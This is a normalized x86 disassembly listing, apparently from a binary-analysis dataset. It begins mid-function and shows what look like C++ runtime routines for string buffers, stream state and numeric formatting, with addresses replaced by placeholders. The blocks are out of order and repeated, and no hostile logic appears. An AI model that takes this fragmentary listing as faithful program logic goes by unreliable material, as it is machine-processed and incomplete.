call sub_419ffe
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_41ac98
lea ecx [ ebp + 0x8 ]
call sub_4197b1
push esi
call sub_4197dd
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_40c220
push ebp
mov ebp esp
push 0xffffffff
push sub_42db1c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_41ac18
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x38 ]
call sub_40b3d0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
mov [ ebp - 0x4 ] 0xffffffff
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x38 ]
call sub_40b320
mov ebx 0x1
mov [ ebp - 0x10 ] ebx
mov [ esi + 0x4 ] 0x0
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_40b1e0
jmp r-xdata
sub_40c2f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] 0x0
call sub_4076d0
mov eax esi
pop esi
pop ebp
retn 0x8
sub_40c320
push ebp
mov ebp esp
push 0xffffffff
push sub_42db48
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call j_sub_41d4bc
test al al
jne r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
mov [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_40bf70
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
sub_40c390
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x8 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_4076d0
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40c3e0
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_4076d0
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40c430
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_4076d0
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40c480
push ebp
mov ebp esp
push 0xffffffff
push sub_42da48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_419789
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_419789
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_4197b1
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_419854
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4197b1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_40c220
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_419789
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_419ffe
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_41ac98
lea ecx [ ebp + 0x8 ]
call sub_4197b1
push esi
call sub_4197dd
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_40c5c0
push ebp
mov ebp esp
push 0xffffffff
push sub_42db70
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
mov edi [ esi + 0x10 ]
sar eax 0x1
cmp edi eax
ja r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
lea ecx [ ecx ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov bl [ eax ]
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
push 0x1
push eax
call sub_406f50
test al al
je r-xdata
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_4194e6
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4194e6
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_406c50
test edi edi
je r-xdata
mov [ eax + edi ] 0x0
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_40c68d
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_41ac98
mov edx [ esi ]
push edx
call sub_41a0d6
add esp 0x4
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov bl [ eax ]
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_4194e6
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4194e6
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_406c50
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
sub_40c740
push ebp
mov ebp esp
push 0xffffffff
push sub_42dba0
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] 0x1
xor bl bl
mov ecx [ ebp + 0x1c ]
push ecx
push esi
push eax
mov ecx edi
call sub_40aed0
mov esi eax
cmp esi 0xffffffff
je r-xdata
lea eax [ ebp + 0xc ]
mov esi 0x10
cmp [ ebp + 0x20 ] esi
jb r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ ebp + 0x1c ]
cmp eax esi
jb r-xdata
mov [ ebp + 0x20 ] 0xf
mov [ ebp + 0x1c ] 0x0
mov [ ebp + 0xc ] 0x0
cmp [ ebp + 0x3c ] esi
jb r-xdata
mov eax [ ebp + 0xc ]
push eax
call sub_41a0d6
add esp 0x4
push r--data
call sub_419533
mov ecx eax
sub ecx esi
cmp ecx ebx
jae r-xdata
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x3c
mov ecx [ ebp + 0x28 ]
push ecx
call sub_41a0d6
add esp 0x4
test ebx ebx
je r-xdata
mov ebx ecx
push 0xffffffff
push 0x0
lea edx [ ebp + 0x28 ]
push edx
push esi
mov ecx edi
call sub_407280
add esi [ ebp + 0x38 ]
mov bl 0x1
jmp r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x10
jb r-xdata
cmp [ ebp + 0x20 ] 0x10
mov eax [ ebp + 0xc ]
jae r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
sub eax ebx
sub eax esi
add edx ebx
push eax
add edx esi
push edx
add ecx esi
push ecx
call sub_41a460
mov eax [ edi + 0x10 ]
sub eax ebx
add esp 0xc
cmp [ edi + 0x14 ] 0x10
mov [ edi + 0x10 ] eax
jb r-xdata
mov [ ecx + eax ] 0x0
sub_40c870
push ebp
mov ebp esp
push 0xffffffff
push sub_42dbe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x4 ] edi
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] edi
sete cl
mov [ ebp - 0x28 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x18 ]
add ecx esi
test edx edx
je r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x1c ]
push edx
add ecx esi
call sub_40a090
push eax
mov [ ebp - 0x4 ] 0x2
call sub_40c0e0
mov ebx [ ebp - 0x1c ]
add esp 0x4
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] 0x1
cmp ebx edi
je r-xdata
mov ecx eax
call sub_40bee0
mov [ ebp - 0x4 ] 0x5
call j_sub_41d4bc
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov dl [ ecx + esi + 0x40 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ecx + esi + 0x38 ]
push ebx
mov [ ebp - 0x20 ] dl
mov ebx [ ebp - 0x20 ]
mov edx [ ebp - 0x24 ]
mov edi [ edx ]
push ebx
add eax esi
push eax
push ecx
mov [ ebp - 0x34 ] 0x0
mov eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edx
mov edx [ edi + 0x18 ]
mov [ ebp - 0x4 ] 0x3
call edx
cmp [ ebp - 0x34 ] 0x0
je r-xdata
push edi
lea ecx [ ebp - 0x20 ]
call sub_419789
mov eax [ ebx + 0x4 ]
cmp eax edi
jbe r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
je r-xdata
mov ecx esi
call sub_40bf70
push 0x0
push eax
call sub_40a3c0
or eax 0x4
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x18 ] 0x4
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_4197b1
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_40ca13
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0xc ]
or ecx 0x4
cmp [ eax + 0x38 ] 0x0
jne r-xdata
and ecx 0x17
mov [ eax + 0xc ] ecx
test [ eax + 0x10 ] ecx
jne r-xdata
or ecx 0x4
push 0x0
push 0x0
call sub_41ac98
int3
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_40ca60
push esi
mov esi ecx
mov ecx [ esi ]
mov eax [ ecx ]
mov [ ecx ] ecx
mov ecx [ esi ]
mov [ ecx + 0x4 ] ecx
mov [ esi + 0x4 ] 0x0
cmp eax [ esi ]
je r-xdata
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
pop esi
retn
push edi
lea ebx [ ebx ]
mov edi [ eax ]
push eax
call sub_41a0d6
add esp 0x4
mov eax edi
cmp edi [ esi ]
jne r-xdata
pop edi
sub_40caa0
push ebp
mov ebp esp
push 0xffffffff
push sub_42dc18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ecx + 0x40 ]
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4c ] ebx
test dl 0x2
jne r-xdata
test dl 0x4
jne r-xdata
mov eax [ ecx + 0x24 ]
cmp [ eax ] ebx
je r-xdata
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
lea ecx [ ebp - 0x48 ]
push ecx
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] bl
call sub_4079c0
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov edx [ ecx + 0x20 ]
cmp [ edx ] ebx
je r-xdata
mov eax [ eax ]
mov edx [ ecx + 0x3c ]
cmp edx eax
jb r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x48 ]
push edx
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
add eax [ edx ]
mov ecx [ ecx + 0x10 ]
mov ecx [ ecx ]
sub eax ecx
push eax
push ecx
mov edi 0xf
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_4076d0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov ecx [ ecx + 0x14 ]
mov ecx [ ecx ]
sub eax ecx
push eax
push ecx
mov edi 0xf
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_4076d0
mov [ ebp - 0x4 ] ebx
mov eax edx
lea edx [ ebp - 0x2c ]
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
push edx
mov ecx esi
mov [ esi ] bl
call sub_4079c0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
jmp r-xdata
call sub_41a0d6
add esp 0x4
sub_40cbd0
push ebp
mov ebp esp
push 0xffffffff
push sub_42dc60
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov al [ ebp + 0x18 ]
mov ebx ecx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x4c ] al
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
mov ecx esi
call sub_40a090
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40c480
mov edi [ ebp - 0x58 ]
add esp 0x4
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x4 ] 0xffffffff
test edi edi
je r-xdata
movzx eax [ ebp + 0x1c ]
mov ecx [ ebp - 0x4c ]
mov edx [ ebx ]
mov edx [ edx + 0x1c ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push esi
push eax
push ecx
push edi
mov ecx ebx
call edx
mov eax edi
jmp r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp + 0x1c ] 0x0
mov [ ebp - 0x4 ] 0x1
je r-xdata
push 0x0
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x50 ] edi
call sub_419789
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp - 0x5c ]
lea eax [ ebp - 0x48 ]
push eax
call sub_40b980
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call sub_4079c0
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x4 ] 0x1
jb r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx [ ebp - 0x5c ]
call sub_40b9a0
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
call sub_4079c0
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x4 ] 0x1
jb r-xdata
mov edi [ edi + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x64 ]
not edi
call sub_4197b1
and edi [ ebp - 0x50 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ esi + 0x24 ] 0x0
mov edi [ esi + 0x20 ]
mov ecx [ ebp - 0x1c ]
jl r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
mov edx [ ebp - 0x48 ]
push edx
jmp r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ edi + 0x4 ] eax
xor edi edi
jg r-xdata
call sub_41a0d6
add esp 0x4
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push edi
push eax
push ecx
push edx
lea eax [ ebp - 0x68 ]
push eax
push ebx
call sub_40b910
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x1c ]
add esp 0x18
mov [ ebp + 0x10 ] edx
xor edi edi
cmp edi ecx
jbe r-xdata
test edi edi
je r-xdata
push ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
lea edx [ ebp - 0x60 ]
push edx
push ebx
call sub_40b8a0
mov ecx [ eax ]
xor edx edx
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push edi
mov [ esi + 0x20 ] edx
mov [ esi + 0x24 ] edx
mov edx [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
push edx
push eax
push ecx
push esi
push ebx
mov [ ebp + 0x10 ] eax
call sub_40b910
add esp 0x30
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
lea eax [ ebp - 0x2c ]
sub edi ecx
jmp r-xdata
mov eax esi
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
mov edx [ esi + 0x14 ]
and edx 0x1c0
cmp edx 0x40
je r-xdata
sub_40cdf0
push ebp
mov ebp esp
push 0xffffffff
push sub_42dca8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x24 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0x30 ]
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x58 ] edx
mov edx [ ebp + 0x2c ]
lea eax [ ebp - 0x70 ]
push eax
mov [ ebp - 0x78 ] ecx
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x4c ] ebx
call sub_40a090
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40c480
mov esi eax
mov eax [ ebp - 0x70 ]
add esp 0x4
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx esi
call sub_40bc30
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call eax
xor ecx ecx
mov [ ebp - 0x60 ] al
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x2c ] cl
mov al [ edi ]
mov [ ebp - 0x4 ] 0x2
cmp al 0x2b
je r-xdata
mov esi eax
push 0x0
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x60 ] esi
call sub_419789
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x64 ] 0x1
mov [ ebp - 0x64 ] ecx
cmp al 0x2d
jne r-xdata
mov esi [ esi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x64 ]
not esi
call sub_4197b1
and esi [ ebp - 0x60 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x48 ]
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x54 ] eax
call sub_41af6d
mov ecx [ eax ]
mov dl [ ecx ]
push ebx
push 0x65
push edi
mov [ ebp - 0x5c ] dl
mov [ ebp - 0x5b ] 0x65
call sub_41aec0
mov esi eax
movsx eax [ ebp - 0x5c ]
push ebx
push eax
push edi
call sub_41aec0
add esp 0x18
mov [ ebp - 0x50 ] eax
test eax eax
jne r-xdata
mov esi [ ebp - 0x7c ]
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ esi + 0x4 ] eax
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x54 ]
mov edx [ ebp - 0x78 ]
mov ecx [ edx + 0x20 ]
add eax ebx
add eax [ ebp - 0x6c ]
add eax [ ebp - 0x58 ]
cmp [ edx + 0x24 ] 0x0
jl r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x50 ] 0x0
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx ecx [ ebp - 0x5c ]
push ebx
push ecx
push edi
call sub_41aec0
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
je r-xdata
cmp ecx eax
jbe r-xdata
test ecx ecx
je r-xdata
push ebx
push edi
lea ecx [ ebp - 0x2c ]
call sub_40b9c0
test esi esi
jne r-xdata
push ebx
push 0x65
push edi
call sub_41aec0
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x60 ]
mov ecx [ ebp + 0x14 ]
sub eax edi
push edx
mov edx [ ebp + 0x10 ]
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push edi
push ecx
push edx
lea eax [ ebp - 0x68 ]
push eax
push esi
call sub_40bb90
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x58 ]
push ecx
mov [ ebp + 0x14 ] edx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push 0x30
push edx
push eax
lea ecx [ ebp - 0x68 ]
push ecx
push esi
call sub_40b910
mov edx [ eax ]
mov ecx [ ebp - 0x7c ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
add esp 0x34
call eax
mov edx [ ebp + 0x14 ]
push 0x1
mov [ ebp - 0x70 ] al
mov ecx [ ebp - 0x70 ]
mov eax [ ebp + 0x10 ]
push ecx
push edx
push eax
lea ecx [ ebp - 0x80 ]
push ecx
push esi
call sub_40b910
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x6c ]
push edx
mov [ ebp + 0x14 ] ecx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push 0x30
push ecx
push edx
